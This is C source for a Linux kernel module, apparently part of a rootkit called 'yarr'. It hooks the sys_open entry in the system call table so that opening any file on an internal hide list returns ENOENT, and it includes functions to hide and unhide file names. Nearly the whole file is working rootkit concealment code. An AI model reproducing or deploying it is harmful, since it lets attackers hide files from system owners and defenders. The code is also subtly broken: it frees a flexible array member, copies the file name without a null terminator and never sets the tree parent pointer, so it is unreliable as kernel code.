#include <linux/slab.h>
#include <linux/rbtree.h>
#include <linux/namei.h>
#include <linux/unistd.h>

#include "hidefile.h"
#include "log.h"
#include "hook.h"

typedef struct hidden_file {
    struct rb_node node;

    char fname[0];
} __HiddenFile_t;

/* The list tracking the hidden files */
struct rb_root __hidden_file_list = RB_ROOT;

/* The original sys_call_table where the real syscalls are kept. */
static unsigned long *__sct = NULL;

static __HiddenFile_t * __HiddenFile_init(const char *fname) {
    __HiddenFile_t *this;
    unsigned long fname_len;

    if (fname == NULL) {
        yarr_log("fname is NULL");
        return NULL;
    }

    fname_len = strlen(fname);
    this = kmalloc(sizeof(__HiddenFile_t) + fname_len + 1, GFP_KERNEL);
    if (this == NULL) {
        yarr_log("Couldn't allocate memory for __HiddenFile_t entry");
        return NULL;
    }

    strncpy(this->fname, fname, fname_len);
    return this;
}

void __HiddenFile_free(__HiddenFile_t *entry) {
    if (entry != NULL) {
        kfree(entry->fname);
    }

    kfree(entry);
    return;
}

static __HiddenFile_t *
__HiddenFile_search(struct rb_root *tree, const char *fname) {
    __HiddenFile_t *entry;
    struct rb_node *iter;
    int res;

    if (tree == NULL || fname == NULL) {
        yarr_log("Argument is NULL");
        return NULL;
    }

    iter = tree->rb_node;
    while (iter != NULL) {
        entry = rb_entry(iter, __HiddenFile_t, node);

        res = strcmp(entry->fname, fname);
        if (res > 0) {
            iter = iter->rb_left;
        } else if (res < 0) {
            iter = iter->rb_right;
        } else {
            return entry;
        }
    }

    return NULL;
}

static int
__HiddenFile_insert(struct rb_root *tree, __HiddenFile_t *new_entry) {
    __HiddenFile_t *current_entry;
    struct rb_node **link, *parent;
    int res;

    if (tree == NULL || new_entry == NULL) {
        yarr_log("Argument is NULL");
        return -1;
    }

    link = &tree->rb_node;
    parent = NULL;
    while (*link != NULL) {
        current_entry = rb_entry(*link, __HiddenFile_t, node);
        res = strcmp(current_entry->fname, new_entry->fname);
        if (res > 0) {
            link = &((*link)->rb_left);
        } else if (res < 0) {
            link = &((*link)->rb_right);
        } else {
            // TODO: Return error code.
            return -2;
        }
    }

    rb_link_node(&new_entry->node, parent, link);
    rb_insert_color(&new_entry->node, tree);
    return 0;
}

static inline int __file_is_hidden(const char *fname) {
    return __HiddenFile_search(&__hidden_file_list, fname) == NULL? 0: 1;
}

/* This is the list of syscalls that uses a const char __user * as one of their
 * arguments:
 * truncate
 * truncate64
 * faccessat
 * access
 * chdir
 * chroot
 * fchmodat
 * chmod
 * fchownat
 * chown
 * lchown
 * open
 * openat
 * creat
 * stat
 * lstat
 * newstat
 * newlstat
 * newfstatat
 * readlinkat
 * readlink
 * stat64
 * lstat64
 * fstatat64
 * uselib
 * statfs
 * statfs64
 * quotactl
 * utimensat
 * futimesat
 * mknodat
 * mknod
 * mkdirat
 * mkdir
 * rmdir
 * unlinkat
 * unlink
 * symlinkat
 * symlink
 * linkat
 * link
 * renameat2
 * renameat
 * rename
 * write
 * pwrite64
 * setxattr
 * lsetxattr
 * fsetxattr
 * getxattr
 * lgetxattr
 * fgetxattr
 * listxattr
 * llistxattr
 * removexattr
 * lremovexattr
 * fremovexattr
 * acct
 * chown16
 * lchown16
 * swapoff
 * swapon
 */

asmlinkage long __yarr__x64_sys_open(const struct pt_regs *regs) {
    long (*__x64_sys_open)(const struct pt_regs *);
    const char *filename;

    if (regs == NULL) {
        yarr_log("regs is NULL");
        return -1;
    }

    filename = (const char *)regs->di;
    yarr_log("opening file %s", filename);
    if (__file_is_hidden(filename)) {
        return -ENOENT;
    }

    __x64_sys_open = __CAST_TO_SYSCALL(__sct[__NR_open]);
    return __x64_sys_open(regs);
}

/*****************************************************************************/

int hidefile_init(void) {
    __sct = get_original_syscall_table64();
    return 0;
}

int hidefile_finish(void) {
    unhide_file_all();
    __hidden_file_list = RB_ROOT;
    return 0;
}

int hidefile_install_hooks(void) {
    int err;

    err = install_hook(__NR_open, __yarr__x64_sys_open);
    return err;
}

int hide_file(const char *fname) {
    __HiddenFile_t *new_entry;

    if (fname == NULL) {
        yarr_log("fname is NULL");
        return -1;
    }

    new_entry = __HiddenFile_init(fname);
    if (new_entry == NULL) {
        yarr_log("Error initializing __HiddenFile_t");
        return -1;
    }

    yarr_log("Hiding file %s", fname);
    return __HiddenFile_insert(&__hidden_file_list, new_entry);
}

int unhide_file(const char *fname) {
    __HiddenFile_t *entry;

    if (fname == NULL) {
        yarr_log("fname is NULL");
        return -1;
    }

    entry = __HiddenFile_search(&__hidden_file_list, fname);
    if (entry == NULL) {
        yarr_log("File %s is not hidden", fname);
        return -1;
    }

    yarr_log("Unhiding file %s", fname);
    rb_erase(&entry->node, &__hidden_file_list);
    __HiddenFile_free(entry);
    return 0;
}

int unhide_file_all(void) {
    __HiddenFile_t *entry;
    struct rb_node *iter, *next;

    iter = rb_first(&__hidden_file_list);
    while (iter != NULL) {
        entry = rb_entry(iter, __HiddenFile_t, node);
        next = rb_next(iter);

        rb_erase(&entry->node, &__hidden_file_list);
        __HiddenFile_free(entry);

        iter = next;
    }

    return 0;
}

